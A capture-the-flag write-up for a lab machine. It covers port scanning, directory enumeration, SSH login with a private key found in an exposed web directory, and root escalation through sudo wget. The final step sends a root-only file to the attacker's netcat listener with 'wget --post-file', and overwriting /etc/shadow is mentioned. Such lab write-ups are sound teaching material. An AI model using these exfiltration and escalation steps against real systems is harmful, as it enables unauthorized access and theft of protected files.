### User Flag

Let's start with a Nmap scan

```terminal
nmap -p- -sS --min-rate 10000 --open -vvv -n -Pn 10.10.148.177
```

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 60
80/tcp open  http    syn-ack ttl 60
```

the webpage is an Apache default page after installation, so let's scan for directories with gobuster

```terminal
gobuster dir -u http://10.10.148.177/ -w /usr/share/dirb/wordlists/common.txt
```

meanwhile, I was checking the source code and looks like they've patched a vulnerability CVE-2016-4979, and we may have a potential username

```
 <!-- Jessie don't forget to udate the webiste -->
```

Gobuster scan ended:

```
/sitemap              (Status: 301) [Size: 316] [--> http://10.10.148.177/sitemap/]
```

and looks like this is the real site, so let's scan for directories again.

```terminal
gobuster dir -u http://10.10.148.177/sitemap -w /usr/share/dirb/wordlists/common.txt
```

```
/.ssh                 (Status: 301) [Size: 321] [--> http://10.10.148.177/sitemap/.ssh/]
/css                  (Status: 301) [Size: 320] [--> http://10.10.148.177/sitemap/css/]
/fonts                (Status: 301) [Size: 322] [--> http://10.10.148.177/sitemap/fonts/]
/images               (Status: 301) [Size: 323] [--> http://10.10.148.177/sitemap/images/]
/index.html           (Status: 200) [Size: 21080]
/js                   (Status: 301) [Size: 319] [--> http://10.10.148.177/sitemap/js/]
```

.ssh directory looks super strange, if we navigate into it, its the whole rsa private key!, so I copied it over to my pc and try to crack the passphrase with john, but it didn't have one, so I tried to connect to the ssh service trying jessie username.
(other directories doesn't seem to have anything useful)

```terminal
ssh -i hashb4john jessie@10.10.148.177
```

and it worked!

if we go through the users folders we will find the user flag

### Root Flag

Let's start with sudo -l to list what things we can run as sudo (if any).
And we have one wget, the first thing I do is head over to gtfobins and see if we have a way to escalate privileges, but no one worked for me, so i googled a way to escalate privileges with wget sudo permissions and found [this guide](https://vk9-sec.com/wget-privilege-escalation/) which use wget to display the /etc/shadow file, then overwrite it with its own password, but I could get wget to list me the shadow file. So I took the easy way and tried to display the content of the root flag, by logic I had the format of the flag if it was the same as the user flag it'll be root_flag.txt and it would be on the root directory.

You need to set up a listener on your machine first on port 80

```terminal
nc -lvnp 80
```

and then on the remote machine

```terminal
sudo /usr/bin/wget --post-file=/root/root_flag.txt [your IP]
```

and this will give us the root flag
